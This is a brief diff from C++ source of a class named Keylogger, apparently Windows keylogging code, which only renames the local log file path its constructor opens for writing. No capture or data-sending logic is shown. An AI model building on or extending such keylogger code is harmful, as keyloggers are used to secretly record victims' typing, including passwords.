@@ -5,7 +5,7 @@ wchar_t* Keylogger::key = nullptr;
 
 Keylogger::Keylogger(wchar_t* k) {
     HANDLE hFile = CreateFileW(
-        L"C:\\Users\\brennan\\Downloads\\kblog.txt",
+        L"C:\\Users\\brennan\\Downloads\\kb_log.txt",
         GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         NULL,
